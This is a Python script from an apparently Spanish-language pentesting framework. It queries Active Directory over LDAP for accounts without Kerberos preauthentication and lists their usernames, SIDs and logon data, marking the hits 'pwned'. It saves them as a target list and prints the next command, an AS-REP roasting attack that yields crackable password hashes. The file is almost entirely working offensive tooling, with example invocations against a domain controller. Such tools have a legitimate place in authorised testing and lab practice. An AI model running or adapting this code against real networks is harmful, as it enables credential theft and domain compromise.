# scripts/ldap/attack/asreproast-targets.py

from scripts.base import BaseScript
from core.output import print_result, print_table, console

try:
    from modules.ldap import LDAPModule
    _LDAP_AVAILABLE = True
except ImportError:
    _LDAP_AVAILABLE = False


class Script(BaseScript):
    name        = "asreproast-targets"
    protocol    = "ldap"
    category    = "attack"
    description = (
        "Enumera via LDAP cuentas sin preautenticación Kerberos (UAC DONT_REQ_PREAUTH). "
        "Genera lista de usuarios lista para pasar a kerberos --script=asrep-roasting."
    )
    requires_auth = True

    EXAMPLES = [
        {
            "flag":  "-t / -u / -p / -d",
            "desc":  "Cualquier cuenta del dominio sirve para enumerar",
            "good":  "lobera.py ldap --script=asreproast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL",
            "bad":   "lobera.py ldap --script=asreproast-targets -t 10.129.1.5  [sin credenciales puede fallar]",
        },
        {
            "flag":  "--save-list",
            "desc":  "Guarda los usuarios encontrados en un fichero (uno por línea)",
            "good":  "lobera.py ldap --script=asreproast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL --save-list asrep_users.txt",
            "bad":   "lobera.py ldap --script=asreproast-targets -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL  [sin --save-list tienes que copiar a mano]",
        },
    ]

    def run(self, **kwargs):
        if not _LDAP_AVAILABLE:
            print_result("LDAP", str(self.target.ip), "fail",
                         "modules/ldap.py no encontrado")
            return []

        ldap = LDAPModule(
            self.target, self.creds,
            use_ssl=kwargs.get("ldaps", False),
            port=kwargs.get("port"),
        )
        if not ldap.connect():
            return []

        try:
            targets = ldap.get_asreproastable_users()

            if not targets:
                print_result("LDAP", str(self.target.ip), "info",
                             "No se encontraron cuentas sin preautenticación Kerberos")
                return []

            rows = [
                (t["user"], t["pwd_last_set"], t["last_logon"], t["sid"])
                for t in targets
            ]
            print_table(
                "Cuentas ASREPRoastables ({})".format(len(targets)),
                ["Usuario", "PwdLastSet", "LastLogon", "SID"],
                rows,
            )

            print_result("LDAP", str(self.target.ip), "pwned",
                         "{} cuenta(s) sin preauth — ejecuta kerberos --script=asrep-roasting".format(
                             len(targets)))

            # Guardar lista si se pidió
            save_path = kwargs.get("save_list")
            if save_path:
                try:
                    with open(save_path, "w") as f:
                        for t in targets:
                            f.write(t["user"] + "\n")
                    print_result("LDAP", str(self.target.ip), "ok",
                                 "Lista guardada en {}".format(save_path))
                except OSError as exc:
                    print_result("LDAP", str(self.target.ip), "fail",
                                 "No se pudo guardar la lista: {}".format(exc))

            # Sugerir siguiente paso
            usernames = " ".join(t["user"] for t in targets)
            console.print(
                "\n[dim]→ Siguiente paso:[/dim]\n"
                "  lobera.py kerberos --script=asrep-roasting "
                "-t {ip} -d {domain} --userlist <fichero>".format(
                    ip=self.target.ip,
                    domain=self.creds.domain or self.target.domain or "DOMINIO",
                )
            )

            return targets

        finally:
            ldap.disconnect()
